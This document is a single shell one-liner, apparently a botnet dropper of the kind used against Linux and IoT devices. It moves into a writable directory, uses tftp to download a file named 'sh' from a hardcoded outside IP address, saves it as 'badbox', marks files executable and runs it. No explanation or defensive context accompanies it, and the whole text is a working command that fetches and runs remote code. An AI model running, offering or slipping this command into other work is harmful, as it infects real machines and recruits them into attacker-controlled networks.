cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 198.23.157.173 -c get sh;cat sh >badbox;chmod +x *;./badbox
